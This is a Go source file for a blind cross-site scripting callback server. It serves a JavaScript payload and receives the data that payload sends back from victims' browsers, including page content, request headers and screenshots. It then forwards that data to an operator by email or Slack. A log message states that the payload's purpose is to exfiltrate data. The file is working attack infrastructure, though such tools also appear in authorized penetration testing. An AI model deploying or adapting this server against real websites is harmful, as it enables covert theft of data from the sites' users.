package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/smtp"
	"os"
	"strings"
	"text/template"

	"github.com/gorilla/mux"
	"github.com/joho/godotenv"
	"github.com/rs/cors"
)

type Config struct {
	Port         string
	MailServer   string
	MailUser     string
	MailPass     string
	MailTo       string
	MailFrom     string
	SlackWebhook string
	ServeURL     string
}

type PayloadData struct{ HostUrl string }

var config Config

func reqCallbackHandler(w http.ResponseWriter, r *http.Request) {
	data := make(map[string]interface{})

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return
	}

	vars := mux.Vars(r)

	if string(body) == "" {
		body = []byte("(null)")
	}

	data["key"] = vars["key"]
	data["body"] = string(body)

	notify(data, r)
}

func payloadHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("Serving payload to %v", r.RemoteAddr)

	tmpl := template.Must(template.ParseFiles("payload.js"))
	tmpl.Execute(w, &PayloadData{
		HostUrl: config.ServeURL + "/c",
	})
}

func callbackHandler(w http.ResponseWriter, r *http.Request) {
	if body, err := ioutil.ReadAll(r.Body); err == nil {
		log.Println("Sending gxss alert")

		var data map[string]interface{}
		err := json.Unmarshal(body, &data)
		if err != nil {
			log.Printf("error parsing body: %v", err)
			return
		}

		data["remote_addr"] = r.RemoteAddr

		notify(data, r)
	}
}

func notify(data map[string]interface{}, r *http.Request) {
	if config.SlackWebhook != "" {
		slackWebhook(data, r)
	}

	if config.MailServer != "" {
		sendMail(data, r)
	}
}

func sendMail(body map[string]interface{}, r *http.Request) {

	var b strings.Builder
	var h strings.Builder
	var screenshot string

	for k, v := range r.Header {
		val := strings.Join(v, ",")
		fmt.Fprintf(&h, "%v: %v\n", html.EscapeString(k), html.EscapeString(val))
	}

	b.WriteString("<strong>new gxss callback</strong><br><br/>")
	fmt.Fprintf(&b, "<pre>%v</pre>\n\n", h.String())

	for k, v := range body {

		s := "(null)"

		switch value := v.(type) {
		case string:
			if value != "" {
				s = value
			}
		}

		if k == "screenshot" {
			screenshot = s
			continue
		}

		b.WriteString(
			fmt.Sprintf("<strong>%s</strong>:\n <pre>%s</pre><br>", html.EscapeString(k), html.EscapeString(s)))
	}

	server, _, _ := net.SplitHostPort(config.MailServer)

	auth := smtp.PlainAuth(
		"",
		config.MailUser,
		config.MailPass,
		server,
	)

	var img string

	if screenshot != "" {
		img = fmt.Sprintf("<strong>screenshot:</strong><br><img src='%v'>", screenshot)
	}

	msg := fmt.Sprintf("From: %v\n"+
		"To: %v\n"+
		"Subject: gxss alert\n"+
		"MIME-version: 1.0;\nContent-Type: text/html; charset=\"UTF-8\";\n\n%s<br>%v",
		config.MailFrom, config.MailTo, b.String(), img)

	err := smtp.SendMail(
		config.MailServer,
		auth,
		config.MailFrom,
		[]string{config.MailTo},
		[]byte(msg),
	)
	if err != nil {
		log.Fatal(err)
	}
}

func slackWebhook(body map[string]interface{}, r *http.Request) {

	var b strings.Builder
	var h strings.Builder

	for k, v := range r.Header {
		fmt.Fprintf(&h, "%v: %v\n", k, v)
	}

	b.WriteString("*new gxss callback*\n\n")
	fmt.Fprintf(&b, "```%v```\n\n", h.String())

	for k, v := range body {
		if v == "" {
			v = "(null)"
		}

		if k == "screenshot" {
			continue
		}

		b.WriteString(fmt.Sprintf("*%s*:\n```%s```\n\n", k, v))
	}

	payload := map[string]interface{}{
		"mrkdwn": true,
		"text":   b.String(),
	}

	jsonValue, _ := json.Marshal(payload)

	resp, err := http.Post(config.SlackWebhook, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		log.Printf("error: slack alert failed: %v", err)
	}

	respBody, _ := ioutil.ReadAll(resp.Body)
	if string(respBody) != "ok" {
		log.Printf("slack resp: %v", string(respBody))
	}
}

func init() {
	// loads values from .env into the system
	if err := godotenv.Load(); err != nil {
		log.Print("No .env file found")
	}

	config.Port = os.Getenv("PORT")
	config.MailServer = os.Getenv("MAIL_SERVER")
	config.MailUser = os.Getenv("MAIL_USER")
	config.MailPass = os.Getenv("MAIL_PASS")
	config.MailFrom = os.Getenv("MAIL_FROM")
	config.MailTo = os.Getenv("MAIL_TO")
	config.SlackWebhook = os.Getenv("SLACK_WEBHOOK")
	config.ServeURL = os.Getenv("SERVE_URL")
}

func main() {

	if config.MailServer == "" && config.SlackWebhook == "" {
		log.Println("warning: no alerting mechanism configured")
	}

	if config.ServeURL == "" {
		log.Println("warning: no serve url set, this will prevent the payload to exfiltrate data")
	}

	r := mux.NewRouter()

	r.HandleFunc("/", payloadHandler)
	r.HandleFunc("/c", callbackHandler)
	r.HandleFunc("/k{key}", reqCallbackHandler)

	handler := cors.Default().Handler(r)
	log.Printf("Serving on :%v\n", config.Port)
	log.Fatal(http.ListenAndServe(":"+config.Port, handler))
}
